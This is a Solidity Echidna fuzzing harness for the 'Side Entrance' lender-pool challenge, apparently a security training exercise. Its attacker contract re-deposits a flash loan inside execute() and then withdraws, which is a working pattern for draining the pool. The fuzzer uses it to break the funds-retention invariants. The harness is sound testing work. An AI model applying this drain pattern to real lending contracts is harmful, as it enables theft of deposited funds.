pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna contracts/side-entrance/Invariants.sol --contract SideEntranceTests --config contracts/side-entrance/config.yaml --seed 5561464089567990393
///      ```

contract SideEntranceTests is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    uint256 constant INITIAL_POOL_BALANCE = 1000 ether;

    constructor() payable {
        require(msg.value >= INITIAL_POOL_BALANCE);

        // SideEntranceTests is our attacker. This means we can't have it deposit the funds. We solve this by having SideEntranceTests instantiate a PoolDepositer to deposit the funds in the pool.
        pool = new SideEntranceLenderPool();
        new PoolDepositor{value: INITIAL_POOL_BALANCE}(pool);
    }

    receive() external payable {}

    function withdraw() external {
        pool.withdraw();
    }

    // @audit As an invariant tester, you have to know what the execute function could be such that the invariant breaks.
    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function flashLoan(uint256 _amount) public {
        pool.flashLoan(_amount);
    }

    function echidna_test_pool_retains_funds() public view returns (bool) {
        return address(pool).balance >= INITIAL_POOL_BALANCE;
    }

    function echidna_test_pool_retains_some_funds() public view returns (bool) {
        return address(pool).balance > 0;
    }
}

contract PoolDepositor {
    constructor(SideEntranceLenderPool pool) payable {
        pool.deposit{value: msg.value}();
    }
}
